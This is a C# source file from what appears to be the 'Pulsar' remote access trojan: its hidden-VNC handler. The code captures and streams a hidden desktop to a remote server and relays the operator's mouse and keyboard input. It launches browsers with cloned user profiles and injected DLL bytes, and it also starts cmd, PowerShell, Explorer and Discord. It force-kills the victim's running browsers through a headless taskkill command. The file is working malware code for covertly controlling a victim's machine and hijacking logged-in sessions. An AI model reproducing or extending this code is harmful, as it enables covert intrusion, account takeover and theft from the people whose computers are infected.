using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Pulsar.Client.Helper;
using Pulsar.Client.Helper.HVNC;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;

namespace Pulsar.Client.Messages
{
    public class HVNCHandler : IMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _desktopData = null;
        private Bitmap _desktop = null;
        private ISender _clientMain;
        private Thread _captureThread;
        private CancellationTokenSource _cancellationTokenSource;

        private string _activeSessionId = string.Empty;
        private long _frameSequence;


        private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
        private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
        private readonly ProcessController ProcessHandler = new ProcessController("PulsarDesktop");

        // frame control variables
        private readonly ConcurrentQueue<byte[]> _frameBuffer = new ConcurrentQueue<byte[]>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        //fps counting
        private int _framesSent = 0;
        private float _currentFps = 0f;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();

        public bool CanExecute(IMessage message)
        {
            return message is GetHVNCDesktop ||
                   message is DoHVNCInput ||
                   message is StartHVNCProcess ||
                   message is GetHVNCMonitors ||
                   message is CancelHVNCProcessLaunch ||
                   message is GetHVNCLaunchHistory ||
                   message is GetHVNCBrowserCatalog;
        }

        public bool CanExecuteFrom(ISender sender)
        {
            return true;
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetHVNCDesktop getDesktop:
                    Execute(sender, getDesktop);
                    break;
                case DoHVNCInput doInput:
                    if (string.IsNullOrEmpty(doInput.SessionId)
                        || string.Equals(doInput.SessionId, _activeSessionId, StringComparison.Ordinal))
                    {
                        InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
                    }
                    break;
                case StartHVNCProcess startHVNCProcess:
                    _ = ExecuteAsync(sender, startHVNCProcess);
                    break;
                case GetHVNCMonitors _:
                    Execute(sender);
                    break;
                case GetHVNCBrowserCatalog catalog:
                    Execute(sender, catalog);
                    break;
                case CancelHVNCProcessLaunch cancel:
                    Execute(sender, cancel);
                    break;
                case GetHVNCLaunchHistory history:
                    Execute(sender, history);
                    break;
            }
        }

        private void Execute(ISender client, GetHVNCDesktop message)
        {
            if (message.Status == RemoteDesktopStatus.Stop)
            {
                StopScreenStreaming();
            }
            else if (message.Status == RemoteDesktopStatus.Start)
            {
                _activeSessionId = message.SessionId ?? string.Empty;
                _frameSequence = 0;
                StartScreenStreaming(client, message);
            }
            else if (message.Status == RemoteDesktopStatus.Continue)
            {
                if (!string.IsNullOrEmpty(message.SessionId)
                    && !string.Equals(message.SessionId, _activeSessionId, StringComparison.Ordinal))
                {
                    return;
                }

                Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartScreenStreaming(ISender client, GetHVNCDesktop message)
        {
            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
            var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };

            if (_streamCodec == null)
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

            if (message.CreateNew)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
            {
                _streamCodec?.Dispose();
                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
            }

            _clientMain = client;

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);

            if (_captureThread == null || !_captureThread.IsAlive)
            {
                _cancellationTokenSource = new CancellationTokenSource();
                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token, message.DisplayIndex))
                {
                    IsBackground = true,
                    Name = "HVNC Capture Loop"
                };
                _captureThread.Start();
            }
        }

        private void StopScreenStreaming()
        {
            _cancellationTokenSource?.Cancel();

            if (_captureThread != null && _captureThread.IsAlive)
            {
                _frameRequestEvent.Set();
                _captureThread = null;
            }

            if (_desktop != null)
            {
                if (_desktopData != null)
                {
                    try
                    {
                        _desktop.UnlockBits(_desktopData);
                    }
                    catch
                    {
                    }
                    _desktopData = null;
                }
                _desktop.Dispose();
                _desktop = null;
            }

            if (_streamCodec != null)
            {
                _streamCodec.Dispose();
                _streamCodec = null;
            }

            ClearFrameBuffer();
            Interlocked.Exchange(ref _pendingFrameRequests, 0);
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken, int displayIndex)
        {
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        _frameRequestEvent.WaitOne(500);

                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    byte[] frameData = CaptureFrame(displayIndex);
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(frameData);
                        _framesSent++;

                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            _currentFps = _framesSent / (_stopwatch.ElapsedMilliseconds / 1000f);
                            _framesSent = 0;
                            _stopwatch.Restart();
                        }
                    }

                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out byte[] frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception)
                {
                    Thread.Sleep(100);
                }
            }
        }        
        
        private byte[] CaptureFrame(int displayIndex)
        {
            try
            {
                _desktop = ImageHandler.Screenshot(displayIndex);

                if (_desktop == null)
                {
                    return null;
                }

                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
                Bitmap processedBitmap = _desktop;
                
                if (_desktop.PixelFormat != codecPixelFormat)
                {
                    try
                    {
                        processedBitmap = new Bitmap(_desktop.Width, _desktop.Height, codecPixelFormat);
                        using (Graphics g = Graphics.FromImage(processedBitmap))
                        {
                            g.DrawImage(_desktop, 0, 0, _desktop.Width, _desktop.Height);
                        }
                        _desktop.Dispose();
                        _desktop = processedBitmap;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
                        // Continue with original bitmap if conversion fails
                        processedBitmap = _desktop;
                    }
                }

                _desktopData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                    _streamCodec.CodeImage(_desktopData.Scan0,
                        new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                        new Size(processedBitmap.Width, processedBitmap.Height),
                        processedBitmap.PixelFormat, stream);

                    return stream.ToArray();
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (_desktopData != null)
                {
                    _desktop.UnlockBits(_desktopData);
                    _desktopData = null;
                }
                _desktop?.Dispose();
                _desktop = null;
            }
        }

        private void SendFrameToServer(byte[] frameData, bool isLastRequestedFrame)
        {
            if (frameData == null || _clientMain == null) return;

            try
            {
                _clientMain.Send(new GetHVNCDesktopResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    IsLastRequestedFrame = isLastRequestedFrame,
                    Fps = _currentFps,
                    SessionId = _activeSessionId,
                    FrameSequence = Interlocked.Increment(ref _frameSequence)
                });
            }
            catch (Exception)
            {
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private async Task ExecuteAsync(ISender client, StartHVNCProcess message)
        {
            try
            {
                SendProcessStatus(client, message, HVNCProcessStage.Validating, "Validating HVNC launch request.");

                string name = message.Path;
                bool dontCloneProfile = message.DontCloneProfile;
                byte[] dllBytes = message.DllBytes;

            var browserPaths = new Dictionary<string, string>
            {
                { "Chrome", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe" },
                { "Edge", Environment.GetEnvironmentVariable("PROGRAMFILES(X86)") + "\\Microsoft\\Edge\\Application\\msedge.exe" },
                { "Brave", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" },
                { "Opera", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera\\opera.exe" },
                { "OperaGX", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Opera GX\\opera.exe" },
                { "Mozilla", Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\firefox.exe" }
            };

            if (dontCloneProfile && browserPaths.TryGetValue(name, out string executablePath) && File.Exists(executablePath))
            {
                SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting browser without profile cloning.");
                string browserProcess = name.ToLower().Replace("mozilla", "firefox").Replace("edge", "msedge").Replace("operagx", "opera");
                string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
                Debug.WriteLine(killCommand);
                ProcessHandler.CreateProc(killCommand);
                await Task.Delay(1000).ConfigureAwait(false);
                
                Debug.WriteLine($"Direct starting browser: {executablePath}");

                ProcessHandler.CreateProc(executablePath);
                SendProcessStatus(client, message, HVNCProcessStage.Completed, "Browser launch completed.", GetCurrentProcessId(browserProcess));
                return;
            }

                switch (name)
                {
                    case "GenericChromium":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing generic Chromium profile.");
                        await ProcessHandler.StartGenericChromiumAsync(
                            dllBytes,
                            message.CustomBrowserPath,
                            message.CustomSearchPattern,
                            message.CustomReplacementPath
                        ).ConfigureAwait(false);
                        break;
                    case "Chrome":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Chrome profile.");
                        await ProcessHandler.StartChromeAsync(dllBytes).ConfigureAwait(false);
                        break;
                    case "Edge":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Edge profile.");
                        await ProcessHandler.StartEdgeAsync(dllBytes).ConfigureAwait(false);
                        break;
                    case "Brave":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Brave profile.");
                        await ProcessHandler.StartBraveAsync(dllBytes).ConfigureAwait(false);
                        break;
                    case "Opera":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Opera profile.");
                        await ProcessHandler.StartOperaAsync(dllBytes).ConfigureAwait(false);
                        break;
                    case "OperaGX":
                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing OperaGX profile.");
                        await ProcessHandler.StartOperaGXAsync(dllBytes).ConfigureAwait(false);
                        break;
                    case "Explorer":
                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Explorer process.");
                        ProcessHandler.StartExplorer();
                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Explorer launch completed.");
                        break;
                    case "Cmd":
                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Command Prompt.");
                        ProcessHandler.StartCmd();
                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Command prompt launch completed.");
                        break;
                    case "Powershell":
                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting PowerShell.");
                        ProcessHandler.StartPowershell();
                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "PowerShell launch completed.");
                        break;
                    case "Mozilla":
                        SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Firefox profile.");
                        try
                        {
                            await ProcessHandler.StartFirefoxAsync(dllBytes).ConfigureAwait(false);
                            SendProcessStatus(client, message, HVNCProcessStage.Completed, "Firefox launch completed.");
                        }
                        catch (Exception ex)
                        {
                            SendProcessStatus(client, message, HVNCProcessStage.Failed, $"Firefox launch failed: {ex.Message}");
                        }
                        break;
                    case "Discord":
                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Discord.");
                        ProcessHandler.StartDiscord();
                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Discord launch completed.");
                        break;
                    default:
                        ProcessHandler.StartGeneric(name);
                    SendProcessStatus(client, message, HVNCProcessStage.Completed, "Custom process launch completed.");
                        break;
                }

            if (name != "Explorer" && name != "Cmd" && name != "Powershell"
                && name != "Discord" && name != "Custom" && name != "Mozilla" && name != "Firefox")
            {
                SendProcessStatus(client, message, HVNCProcessStage.Completed, $"{name} launch completed.");
            }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"HVNC process start failed: {ex.Message}");
            SendProcessStatus(client, message, HVNCProcessStage.Failed, ex.Message);
            }
        }

        private static void SendProcessStatus(
            ISender client,
            StartHVNCProcess message,
            HVNCProcessStage stage,
            string statusMessage,
            int processId = 0)
        {
            if (client == null)
            return;

            client.Send(new HVNCProcessStatus
            {
            SessionId = message.SessionId ?? string.Empty,
            LaunchId = message.LaunchId ?? string.Empty,
            Stage = stage,
            Message = statusMessage,
            ProcessId = processId
            });
        }

        private static int GetCurrentProcessId(string processName)
        {
            if (string.IsNullOrWhiteSpace(processName))
            return 0;

            try
            {
            var process = Process.GetProcessesByName(processName).OrderByDescending(p => p.StartTime).FirstOrDefault();
            return process?.Id ?? 0;
            }
            catch
            {
            return 0;
            }
        }

        private void Execute(ISender client)
        {
            int monitorCount = ImageHandler.GetMonitorCount();
            Debug.WriteLine($"HVNC: Sending monitor count: {monitorCount}");
            client.Send(new GetHVNCMonitorsResponse { Number = monitorCount });
        }

        private void Execute(ISender client, GetHVNCBrowserCatalog request)
        {
            client.Send(new GetHVNCBrowserCatalogResponse
            {
                SessionId = request.SessionId ?? _activeSessionId,
                Browsers = DiscoverBrowsers()
            });
        }

        private static HVNCBrowserDefinition[] DiscoverBrowsers()
        {
            var definitions = new System.Collections.Generic.List<HVNCBrowserDefinition>();

            AddBrowser(definitions, "chrome", "Chrome",
                BrowserConfiguration.GetChromeConfig(),
                "Local\\Google\\Chrome\\User Data",
                "Local\\Google\\Chrome\\KDOT");
            AddBrowser(definitions, "edge", "Microsoft Edge",
                BrowserConfiguration.GetConfig("Edge"),
                "Local\\Microsoft\\Edge\\User Data",
                "Local\\Microsoft\\Edge\\KDOT");
            AddBrowser(definitions, "brave", "Brave",
                BrowserConfiguration.GetConfig("Brave"),
                "Local\\BraveSoftware\\Brave-Browser\\User Data",
                "Local\\BraveSoftware\\Brave-Browser\\KDOT");
            AddBrowser(definitions, "opera", "Opera",
                BrowserConfiguration.GetConfig("Opera"),
                "Roaming\\Opera Software\\Opera Stable",
                "Roaming\\Opera Software\\KDOT");
            AddBrowser(definitions, "opera-gx", "Opera GX",
                BrowserConfiguration.GetConfig("OperaGX"),
                "Roaming\\Opera Software\\Opera GX Stable",
                "Roaming\\Opera Software\\KDOT");

            var firefox = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Mozilla",
                "Firefox");
            definitions.Add(new HVNCBrowserDefinition
            {
                BrowserId = "firefox",
                DisplayName = "Mozilla Firefox",
                Installed = Directory.Exists(firefox),
                ExecutablePath = string.Empty,
                ProfileSource = "Local\\Mozilla\\Firefox",
                ProfileDestination = "Local\\Mozilla\\KDOT",
                SupportsProfileClone = Directory.Exists(firefox),
                SupportsDirectLaunch = Directory.Exists(firefox),
                DetectionSource = "localappdata",
                Architecture = Environment.Is64BitProcess ? "x64" : "x86"
            });

            return definitions.ToArray();
        }

        private static void AddBrowser(
            System.Collections.Generic.ICollection<HVNCBrowserDefinition> definitions,
            string browserId,
            string displayName,
            BrowserConfig config,
            string profileSource,
            string profileDestination)
        {
            bool installed = config != null &&
                             !string.IsNullOrWhiteSpace(config.ExecutablePath) &&
                             File.Exists(config.ExecutablePath);

            definitions.Add(new HVNCBrowserDefinition
            {
                BrowserId = browserId,
                DisplayName = displayName,
                Installed = installed,
                ExecutablePath = installed ? config.ExecutablePath : string.Empty,
                ProfileSource = profileSource,
                ProfileDestination = profileDestination,
                SupportsProfileClone = installed,
                SupportsDirectLaunch = installed,
                DetectionSource = "configured-path",
                Architecture = Environment.Is64BitProcess ? "x64" : "x86"
            });
        }

        private void Execute(ISender client, CancelHVNCProcessLaunch cancel)
        {
            if (!string.IsNullOrEmpty(cancel.SessionId)
                && !string.Equals(cancel.SessionId, _activeSessionId, StringComparison.Ordinal))
            {
                return;
            }

            client.Send(new HVNCProcessStatus
            {
                SessionId = cancel.SessionId ?? _activeSessionId,
                LaunchId = cancel.LaunchId,
                Stage = HVNCProcessStage.Cancelled,
                Message = "HVNC launch cancellation requested.",
                CompletedUtcTicks = DateTime.UtcNow.Ticks
            });
        }

        private void Execute(ISender client, GetHVNCLaunchHistory history)
        {
            client.Send(new GetHVNCLaunchHistoryResponse
            {
                SessionId = history.SessionId ?? _activeSessionId,
                Records = new HVNCLaunchRecord[0]
            });
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                Debug.WriteLine("HVNC Handler Disposed");
                StopScreenStreaming();
                ImageHandler.Dispose();
                InputHandler.Dispose();
                _streamCodec?.Dispose();
                _cancellationTokenSource?.Dispose();
                _frameRequestEvent?.Dispose();
            }
        }
    }
}
